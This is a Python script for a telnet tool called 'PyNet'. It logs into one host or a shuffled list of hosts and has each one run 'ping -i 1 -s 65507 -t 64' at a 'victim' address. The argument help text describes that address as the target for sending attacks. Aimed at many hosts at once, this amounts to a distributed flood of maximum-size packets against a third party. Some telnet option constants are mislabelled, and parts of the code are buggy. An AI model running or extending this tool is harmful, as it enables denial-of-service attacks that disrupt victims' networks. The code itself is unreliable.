#!/usr/bin/env python3

# This script perform telnet connections using socket instead of telnetlib.
# The intention is to execute command sequences quickly.
# Save logs and analyze output for creation of more command sequences.

import os
import sys
import time
import random
import signal
import argparse
import threading

# Personal packages
from utils.colors import Colors
from sockets.sconnection import telnet_auth_sequence, socket_send_sequence, socket_send_command

# Global variable to track remote sockets
remote_sockets = []


def exit_gracully():
    print("\n\n[!] Exiting gracefully...")

    for remote_socket in remote_sockets:
        remote_socket.close()
    sys.exit(0)

# Signal handler function to catch Ctrl+C
def signal_handler(sig, frame):
    exit_gracully()

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)


# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="PyNet - A Python-based tool for telnet and network operations.")
    parser.add_argument("-iL", "--ip_list", help="\t\tPath to a file containing a list of IP addresses or hostnames, one per line.")
    parser.add_argument("-i", "--ip", help="\t\tTarget IP address or hostname to authenticate with.")
    parser.add_argument("-p", "--port", default=23, type=int, help="\t\tTarget port (default is 23 for Telnet).")
    parser.add_argument("-l", "--login", action="store_true", help="\tSimply login on the target system.")
    parser.add_argument("-v", "--victim", help="\tTarget victim for sending attacks.")
    parser.add_argument("-c", "--command", help="\tCommand to execute on the target system.")
    return parser.parse_args()

# Global commands
IAC = b'\xff'   # Interpret As Command      [255]
SE  = b'\xf0'   # Subnegotiation End        [240]
NOP = b'\xf1'   # No Operation              [241]
DM  = b'\xf2'   # Data Mark                 [242]
BRK = b'\xf3'   # Break                     [243]
IP  = b'\xf4'   # Interrupt Process         [244]
AO  = b'\xf5'   # Abort Output              [243]
AYT = b'\xf6'   # Are You There             [246]
EC  = b'\xf7'   # Erase Character           [247]
EL  = b'\xf8'   # Erase Line                [248]
GA  = b'\xf9'   # Go Ahead                  [249]
SB  = b'\xfa'   # Subnegotiation Begin      [250]


# Option Negotiation Commands
WILL = b'\xfb'  #                           [251]
WONT = b'\xfc'  #                           [252]
DO   = b'\xfd'  #                           [253]
DONT = b'\xfe'  #                           [254]

# Telnet options
BINARY_TRANS     = b'\x00'   #              [000]
ECHO             = b'\x01'   #              [001]
RECONNECTION     = b'\x02'   #              [002]
SUPPRESS_GO_AHEAD= b'\x03'   #              [003]
EOF              = b'\x04'   # End of File  [004]
STATUS           = b'\x05'   # End of File  [005]
TIMING_MARK      = b'\x04'   # End of File  [004]
REMOTE_ECHO      = b'\x07'   #              [007]
OUTPUT_LINE_WIDTH= b'\x08'   # Output Line  [008]
ENTER            = b'\r\x00' # Enter Key    [013]

OUTPUT_LINE_WIDTH = b'\x08'       # Output Line Width                           [008]
OUTPUT_PAGE_SIZE = b'\x09'        # Output Page Size                            [009]
OUTPUT_CARRIAGE_RETURN_DISPOSITION = b'\x0A'  # Output Carriage-Return Disposition[010]
OUTPUT_HORIZONTAL_TAB_STOPS = b'\x0B'  # Output Horizontal Tab Stops            [011]
OUTPUT_HORIZONTAL_TAB_DISPOSITION = b'\x0C'  # Output Horizontal Tab Disposition[012]
OUTPUT_VERTICAL_TABSTOPS = b'\x0E'  # Output Vertical Tabstops                  [014]
OUTPUT_VERTICAL_TAB_DISPOSITION = b'\x0F'  # Output Vertical Tab Disposition    [015]
OUTPUT_LINEFEED_DISPOSITION = b'\x10'  # Output Linefeed Disposition            [016]
EXTENDED_ASCII = b'\x11'          # Extended ASCII                [017]
LOGOUT = b'\x12'                  # Logout                        [018]
BYTE_MACRO = b'\x13'              # Byte Macro                    [019]
DATA_ENTRY_TERMINAL = b'\x14'     # Data Entry Terminal           [020]
SUPDUP = b'\x15'                  # SUPDUP                        [021]
SUPDUP_OUTPUT = b'\x16'           # SUPDUP Output                 [022]
SEND_LOCATION = b'\x17'           # Send Location                 [023]
TERMINAL_TYPE = b'\x18'           # Terminal Type                 [024]
END_OF_RECORD = b'\x19'           # End of Record                 [025]
TACACS_USER_IDENTIFICATION = b'\x1A'# TACACS User Identification  [026]
OUTPUT_MARKING = b'\x1B'          # Output Marking                [027]
TERMINAL_LOCATION_NUMBER = b'\x1C'# Terminal Location Number      [028]
TELNET_3270_REGIME = b'\x1D'      # Telnet 3270 Regime            [029]
X3_PAD = b'\x1E'                  # X.3 PAD                       [030]
NEGOTIATE_ABOUT_WINDOW_SIZE = b'\x1F'# Negotiate About Window Size[031]
TERMINAL_SPEED = b'\x20'          # Terminal Speed                [032]
REMOTE_FLOW_CONTROL = b'\x21'     # Remote Flow Control           [033]
LINEMODE = b'\x22'                # Linemode                      [034]
X_DISPLAY_LOCATION = b'\x23'      # X Display Location            [035]
ENVIRONMENT_OPTION = b'\x24'      # Environment Option            [036]
AUTHENTICATION_OPTION = b'\x25'   # Authentication Option         [037]
ENCRYPTION_OPTION = b'\x26'       # Encryption Option             [038]
NEW_ENVIRONMENT_OPTION = b'\x27'  # New Environment Option        [039]
TN3270E = b'\x28'                 # TN3270E                       [040]
XAUTH = b'\x29'                   # XAUTH                         [041]
CHARSET = b'\x2A'                 # CHARSET                       [042]
TELNET_REMOTE_SERIAL_PORT = b'\x2B'  # Telnet Remote Serial Port  [043]
COM_PORT_CONTROL_OPTION = b'\x2C' # Com Port Control Option       [044]
TELNET_SUPPRESS_LOCAL_ECHO = b'\x2D' # Telnet Suppress Local Echo [045]
TELNET_START_TLS = b'\x2E'        # Telnet Start TLS              [046]
KERMIT = b'\x2F'                  # KERMIT                        [047]
SEND_URL = b'\x30'                # SEND-URL                      [048]
FORWARD_X = b'\x31'               # FORWARD_X                     [049]
# Options 50-137 are unassigned
PRAGMA_LOGON = b'\x8A'            # TELOPT PRAGMA LOGON           [138]
SSPI_LOGON = b'\x8B'              # TELOPT SSPI LOGON             [139]
PRAGMA_HEARTBEAT = b'\x8C'        # TELOPT PRAGMA HEARTBEAT       [140]
# Options 141-254 are unassigned

# Basic Commands in Hexadecimal Form
interrupt_process = IAC + IP                    # b'\xff\xf4'
erase_character = IAC + EC                      # b'\xff\xf7'
erase_line = IAC + EL                           # b'\xff\xf8'
are_you_there = IAC + AYT                       # b'\xff\xf6'
abort_output = IAC + AO                         # b'\xff\xf5'
go_ahead = IAC + GA                             # b'\xff\xf9'
subnegotiation_begin = IAC + SB                 # b'\xff\xfa'
subnegotiation_end = IAC + SE                   # b'\xff\xf0'
no_operation = IAC + NOP                        # b'\xff\xf1'
data_mark = IAC + DM                            # b'\xff\xf2'
break_signal = IAC + BRK                        # b'\xff\xf3'

# personal commands
unknown_command = IAC + IP + IAC + DO + b'\x06'
auth_request = IAC + DO + ECHO + IAC + DO + SUPPRESS_GO_AHEAD + IAC + DONT + TERMINAL_TYPE
echo_message = IAC + DO + ECHO

# Disable echo

# Option Negotiation Combinations
will_option = lambda option: IAC + WILL + option
wont_option = lambda option: IAC + WONT + option
do_option = lambda option: IAC + DO + option
dont_option = lambda option: IAC + DONT + option

# Examples of Option Negotiation
will_suppress_go_ahead = will_option(SUPPRESS_GO_AHEAD)
wont_echo = wont_option(ECHO)
do_terminal_type = do_option(TERMINAL_TYPE)
dont_suppress_go_ahead = dont_option(SUPPRESS_GO_AHEAD)

commands = [
    #IAC + IP,
    IAC + WILL + ECHO,
    IAC + DO + ECHO,
    #IAC + EC,
    IAC + EL,
    IAC + AYT,
    IAC + AO,
    IAC + GA,
    IAC + NOP,
    IAC + DM,
    IAC + BRK,
    IAC + WILL + SUPPRESS_GO_AHEAD,
    IAC + WONT + ECHO,
    IAC + DO + TERMINAL_TYPE,
    IAC + DONT + SUPPRESS_GO_AHEAD,
]

commands_empty = []

commands_seq1 = [
    ENTER,
    ENTER,
    b'wap top\r\n',
    b'wap list format 1 path /\r\n',
    b'wap top\r\n'
]
target = b''
commands_seq2 = [
    ENTER,
    b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n'
]





def main():

    # Parse command-line arguments
    args = parse_arguments()

    global target
    target = args.victim.encode('ascii')

    # Option -i is provided
    if args.ip and args.port:

        # Perform a single telnet connection
        if args.login:
            # Handle single session
            handle_target(args.ip, args.port, commands_seq2, 10, True)


    # Option -iL is provided
    elif args.ip_list and args.port and args.login:
        # Read the IP list file and iterate through the IP addresses
        ip_list_path = args.ip_list
        with open(ip_list_path, 'r') as file:
            ip_addresses = file.read().splitlines()

            # Shuffle the list randomly
            random.shuffle(ip_addresses)

        ip_cont = 1
        for ip in ip_addresses:

            # Simply perform a telnet connection.
            if args.login:
                print(Colors.BOLD_WHITE + f"[{ip_cont}] Processing IP:\t[{ip}]" + Colors.R)

                # Spin up our client thread to handle incoming data
                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_empty,))
                target_handler.start()

                # Delay time between threads
                delay = 0.15
                time.sleep(delay)

            ip_cont += 1

    # Error case
    else:
        print("Error: Please provide either -iL or -i option to specify the target IP(s).")


def handle_target(ip, port, command_sequence, timeout=2, detail=True):

    # Setup logs feature
    current_dir = os.getcwd()
    log_dir =  current_dir + "logs/" 
    log_output = log_dir + ip + "_log"

    ## Create the dir if not exist
    if not os.path.exists(log_dir):
        os.makedirs(log_dir, exist_ok=True)

    # Create and append socket session
    remote_socket = telnet_auth_sequence(ip, port, log_output)
    remote_sockets.append(remote_socket)

    #response = socket_send_sequence(remote_socket, command_sequence, timeout, detail, log_output)

    ping_command = b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n'
    response = socket_send_command(remote_socket, ping_command, True)

    # Close the socket after command execution
    if remote_socket:
        try:
            remote_socket.close()
            # Remove the socket from the dictionary
            if remote_socket in remote_sockets:
                del remote_sockets[remote_socket]
        except:
            pass






if __name__ == "__main__":
    main()
